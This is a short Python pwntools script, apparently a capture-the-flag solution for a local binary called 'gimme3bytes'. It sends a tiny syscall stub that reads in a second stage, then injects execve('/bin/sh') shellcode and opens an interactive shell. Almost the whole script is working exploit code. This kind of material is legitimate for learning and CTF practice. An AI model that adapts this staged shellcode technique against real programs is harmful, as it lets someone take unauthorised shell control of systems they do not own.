from pwn import *

context.arch = "amd64"

COMMANDS = '''
b *0x00000000004011f1
c
'''

if args.REMOTE:
    pass
else:
    if args.GDB:
       r = gdb.debug("./gimme3bytes", gdbscript=COMMANDS)
    else:
        r = process("./gimme3bytes") 

#it is all set for a read :)

shellcode1 = '''
syscall
'''

#nops are use as in tiny -> usual execve calling /bin/sh\x00

shellcode2 = '''
nop
nop
mov rdi, 0x0068732f6e69622f
push rdi
mov rdi, rsp
xor rax, rax
xor rsi, rsi
xor rdx, rdx
mov al, 0x3b
syscall
'''

shellcode1_c = asm(shellcode1)
shellcode2_c = asm(shellcode2)

r.send(shellcode1_c)
input("wait")
r.send(shellcode2_c)


r.interactive()